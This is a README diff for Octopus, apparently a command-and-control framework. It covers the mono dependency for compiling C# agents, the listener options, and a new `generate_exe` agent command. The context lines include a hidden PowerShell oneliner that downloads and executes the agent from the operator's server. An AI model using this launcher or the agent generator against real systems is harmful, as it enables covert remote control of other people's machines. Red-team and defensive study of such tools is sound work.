@@ -36,6 +36,14 @@ Octopus has been tested on the following operating systems:
 * Ubuntu (16.04)
 * Kali Linux (2019.2) (No need to install requirements.txt)
 
+Also you need to install mono to make sure that you can compile the C# source without problem.
+
+Octopus depends on mono-csc binary to compile the C# source and you can install it by the following command `apt install mono-devel` which has been tested on kali and ubuntu 16.04.
+
+> if you want to use Octopus without installing mono of course you can do that but you will not be able to use `generate_exe` command.
+
+Also please not that C# compling process depends on `System.Management.Automation.dll` Assembly with SHA1 hash a43ed886b68c6ee913da85df9ad2064f1d81c470
+
 If you have any troubles using Octopus, feel free to open an [issue](https://github.com/mhaskar/Octopus/issues) !
 
 # Installation
@@ -180,12 +188,12 @@ Example (without domain) : listen_http 0.0.0.0 8080 172.0.1.3 5 profile.php op1_
 ##########
 Options info :
 
-BindIP  		IP address that will be used by the listener
-BindPort  		port you want to listen on
-Hostname 		will be used to request the payload from
-Interval 		how may seconds that agent will wait before check for commands
-URL  			page name will hold the payload
-Listener_name  	listener name to use
+BindIP  		  : IP address that will be used by the listener
+BindPort  	  :	port you want to listen on
+Hostname 		  : will be used to request the payload from
+Interval 		  : how may seconds that agent will wait before check for commands
+URL  			    : page name will hold the payload
+Listener_name :  	listener name to use
 
 Octopus >>
 ```
@@ -258,6 +266,8 @@ Please note that you need to provide a valid SSL certficate that is associated w
 
 ### Generate agents
 
+**Powershell oneliner**
+
 To generate an agent for the listener `operation1` we can use the following command:
 
 `generate_powershell operation1`
@@ -270,6 +280,23 @@ powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://192.
 ```
 
 Now we can use this oneliner to start our agent.
+
+**Octopus EXE agent**
+
+To generate an EXE agent for listener `operation1` we can use the following command:
+
+`generate_exe operation1`
+
+and we will get the following results:
+
+```
+Octopus >>generate_exe darkside_operation2 /opt/Octopus/file.exe
+[+] file compiled successfully !
+[+] binary file saved to /opt/Octopus/file.exe
+Octopus >>
+```
+
+> Please note that you have to install mono-csc to compile the C# source.
 
 ### Interacting with agents
 
@@ -410,9 +437,9 @@ PowerView.ps1
 * [ ] Create collaborative team server
 * [ ] Add extra information to gather for ESA module
 * [ ] Add generate HTA payload
-* [ ] Add generate compiled binary
+* [x] Add generate compiled binary
 * [ ] Add auto process injection feature
-* [ ] Add customized profile for listeners
+* [x] Add customized profile for listeners
 
 # Screenshots
 
